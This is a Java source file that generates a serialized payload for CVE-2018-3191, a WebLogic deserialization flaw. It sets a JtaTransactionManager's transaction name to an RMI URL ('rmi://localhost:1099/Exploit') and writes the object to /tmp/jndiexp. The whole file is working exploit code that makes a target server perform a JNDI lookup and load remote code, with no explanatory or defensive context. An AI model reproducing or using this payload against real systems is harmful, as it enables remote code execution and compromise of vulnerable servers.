package jndi;

import com.bea.core.repackaged.springframework.transaction.jta.JtaTransactionManager;

import java.io.FileOutputStream;
import java.io.ObjectOutputStream;

public class CVE_2018_3191 {
    public static void main(String[] args) throws Exception{
        JtaTransactionManager jtaTransactionManager = new JtaTransactionManager();
        jtaTransactionManager.setUserTransactionName("rmi://localhost:1099/Exploit");
        FileOutputStream fileOutputStream = new FileOutputStream("/tmp/jndiexp");
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
        objectOutputStream.writeObject(jtaTransactionManager);
    }
}
